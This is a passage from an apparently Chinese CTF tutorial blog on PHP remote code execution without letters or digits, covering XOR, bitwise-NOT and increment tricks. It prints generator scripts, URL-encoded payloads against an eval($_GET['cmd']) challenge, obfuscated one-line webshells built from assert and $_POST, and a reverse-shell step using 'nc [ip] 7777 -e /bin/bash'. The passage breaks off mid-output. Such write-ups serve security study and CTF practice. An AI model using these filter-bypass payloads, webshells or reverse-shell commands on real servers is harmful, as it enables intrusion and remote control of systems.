+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ZLARRY&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;5&quot;</span>^<span class="string">&quot;Z&quot;</span>;</span><br><span class="line"><span class="variable">$_</span>();</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/50.png" class="" width="50">
+
+<p>在做无字母无数字RCE还有一个技巧就是用<code>_</code>来命名</p>
+<p>这里给出橙子科技的异或运算脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$result1</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))&#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])&#123;</span><br><span class="line">                        <span class="variable">$result1</span>.=<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span>.=<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第一部分：&quot;</span>.<span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第二部分：&quot;</span>.<span class="variable">$result2</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/51.png" class="" width="51">
+
+<p>传入cmd为需要的字符串就可以得到结果</p>
+<img src="/2026/02/28/RCE/52.png" class="" width="52">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/0-9a-z/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比如这道题目就可以用异或出来的两部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">异或运算第一部分：+(+).&amp;/</span><br><span class="line">异或运算第二部分：[@[@@@@</span><br><span class="line">//构造phpinfo</span><br></pre></td></tr></table></figure>
+
+<p>然后传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=$_=&quot;%2B(%2B).%26%2F&quot;^&quot;%5B%40%5B%40%40%40%40&quot;;$_();</span><br><span class="line">//经过URL编码</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/53.png" class="" width="53">
+
+<p>如果我们希望执行其他一些RCE命令，可以通过写一句话木马（<strong>php5条件下</strong>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;assert&#x27;</span>; <span class="comment">//assert替换为&quot;!((%)(&quot;^&quot;@[[@[\&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_POST&#x27;</span>; <span class="comment">//_POST替换为&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>; <span class="comment">//这里需要多加一个反斜杠转义\，否则会出错</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以post提交<code>ls,cat /flag</code>等命令</p>
+<img src="/2026/02/28/RCE/54.png" class="" width="54">
+
+<p>此外还需要进行URL编码</p>
+<p><strong>php7条件下</strong>不能使用assert，但可以使用&#96;&#96;&#96; <code>反引号 ：</code> <code>$_POST[&#39;_&#39;]</code> <code>但是</code>没有回显</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$$_</span>;</span><br><span class="line">`<span class="variable">$__</span>[_]`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以可以采用反弹shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali上开启监听：</span><br><span class="line">nc -lvp 7777</span><br><span class="line">POST提交：</span><br><span class="line">_=nc [ip] 7777 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>具体思路与异或差不多，取反顾名思义就是按位将1变为0，将0变为1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~()会对括号里面的内容进行取反</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这串代码输出a的 ASCII码结果为61，对应二进制为01100001，经过取反后变成10011110对应十六进制为9E，但是由于ASCII码十六进制最大为7F，故%9E这个字符其实不存在</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%9E&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=~(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//输出内容为a</span></span><br></pre></td></tr></table></figure>
+
+<p>但是经过取反可以看到输出了字母a，就可以实现无字母绕过</p>
+<p>此外橙子科技 给了一种中文字符串的方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> ~(<span class="variable">$a</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line"><span class="comment">//这串代码输出结果前一行为e69e81,0位e6,1位9e,2位81</span></span><br><span class="line"><span class="comment">//所以最后取反$a&#123;1&#125;其实就是取反$a的1位9e,即~(9e)结果为a</span></span><br></pre></td></tr></table></figure>
+
+<p>这个的payload老长一串，想一下还是用URL编码的poc吧（<strong>php5</strong>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=~(<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>); <span class="comment">//assert</span></span><br><span class="line"><span class="variable">$__</span>=~(<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>); <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/55.png" class="" width="55">
+
+<p><strong>php7</strong>条件下还是用反引号：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=~(<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>);</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$$_</span>;</span><br><span class="line">`<span class="variable">$__</span>[<span class="string">&#x27;_&#x27;</span>]`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后还是使用shell反弹</p>
+<h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=A;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这串代码输出结果为B，利用这个原理我们可以实现绕过，只要获取A我们就可以获得其他字母</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">++$a //先累加再输出</span><br><span class="line">$a++ //先输出再累加</span><br></pre></td></tr></table></figure>
+
+<p>获取A的方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>原因是<code>[]</code>本来作为一个数组，后面用<code>.</code>拼接上字符串后var_dump结果就变成了字符串Array</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="variable">$__</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$__</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/56.png" class="" width="56">
+
+<p>那么我们就可以通过<code>$_[0]</code>获取字母A</p>
+<img src="/2026/02/28/RCE/57.png" class="" width="57">
+
+<p>但是又由于无数字，所以还需要稍作修改：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>[<span class="variable">$__</span>];</span><br><span class="line"><span class="comment">//$__变量不存在，假值0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>橙子科技的自增脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$cmd2</span>=<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;post&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span>=<span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span>=<span class="string">&quot;\$_.=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span>=<span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span>=<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span>=<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span>=<span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span>=<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span>  <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span>=<span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC2</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span>=<span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span>=<span class="string">&quot;\$____.=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span>=<span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span>=<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span>=<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span>=<span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span>=<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span>=<span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$POC_pat7</span> = <span class="string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$POC_pat7</span>;</span><br><span class="line">    <span class="title function_ invoke__">POC</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$cmd2</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">POC2</span>(<span class="variable">$cmd2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=assert&amp;post=POST</span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="variable">$___</span>=<span class="variable">$_</span>[<span class="variable">$__</span>];<span class="variable">$__</span>=<span class="variable">$___</span>;<span class="variable">$_</span>=<span class="variable">$___</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span 